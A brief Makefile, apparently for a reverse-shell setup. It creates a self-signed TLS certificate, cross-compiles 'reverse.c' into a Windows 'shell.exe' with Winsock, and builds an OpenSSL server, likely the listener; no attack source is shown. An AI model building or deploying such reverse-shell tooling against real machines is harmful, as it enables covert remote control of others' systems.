SRV_KEY=key.pem
SRV_PEM=cert.pem
depends:
	openssl req -subj '/CN=danger.com/O=goody2shoes/C=RU' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
	cat ${SRV_KEY} >> ${SRV_PEM}
shell:
	x86_64-w64-mingw32-gcc reverse.c -o shell.exe -lws2_32
server:
	gcc -Wall -Werr server.c -o server.o -lcrypto -lssl